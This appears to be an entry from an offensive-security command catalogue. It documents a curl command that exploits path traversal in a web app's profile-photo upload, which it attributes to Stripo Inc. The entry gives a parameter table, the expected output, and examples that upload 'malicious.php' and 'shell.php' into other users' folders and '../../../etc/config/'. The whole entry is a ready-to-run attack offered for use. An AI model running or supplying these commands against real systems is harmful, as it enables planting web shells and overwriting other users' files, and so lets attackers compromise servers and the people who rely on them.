---
data: >-
  curl -X POST -H "Cookie: session=your_session_token" -H "Content-Type:
  multipart/form-data" -F "file=@malicious.php" -F
  "path=../../users/otheruser/uploads/"
  https://stripo.example.com/api/upload-profile
tags:
  - web-exploit
  - file-upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:22.897Z'
id: 24d39e27-7e08-40c3-9e01-59c533bf5e4e
verified: false
validated: true
submitted: true
---
---

# curl-file-upload-manipulate

## Command

```bash
curl -X POST -H "Cookie: session=your_session_token" -H "Content-Type: multipart/form-data" -F "file=@malicious.php" -F "path=../../users/otheruser/uploads/" https://stripo.example.com/api/upload-profile
```

## Description

This curl command performs a manipulated file upload to exploit arbitrary path vulnerabilities in web applications like Stripo Inc's profile photo feature. It sends a POST request with a file attachment and a custom path parameter to bypass directory restrictions, enabling uploads to unauthorized locations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for file upload | Yes |
| `-H "Cookie: session=your_session_token"` | Includes authentication cookie for session maintenance | Yes |
| `-H "Content-Type: multipart/form-data"` | Sets the content type for form data including files | Yes |
| `-F "file=@malicious.php"` | Attaches the local file to upload (use any extension) | Yes |
| `-F "path=../../users/otheruser/uploads/"` | Manipulates the path parameter with traversal to target arbitrary directory | Yes |
| `https://stripo.example.com/api/upload-profile` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Cookie: session=abc123" -F "file=@test.jpg" -F "path=../../admin/" https://target.com/upload
```

### Advanced Usage

```bash
curl -X POST -H "Cookie: session=abc123" -H "Authorization: Bearer token" -F "file=@shell.php" -F "path=../../../etc/config/" -v https://target.com/api/profile-upload
```

## Expected Output

A successful response typically includes HTTP 200 OK with a JSON body like {"status": "success", "file_id": "123"}, confirming the upload. Errors may indicate validation failures, such as 400 Bad Request if path traversal is blocked.

## Related

- [[Related Procedure: Exploit Arbitrary File Upload via Profile Photo]]
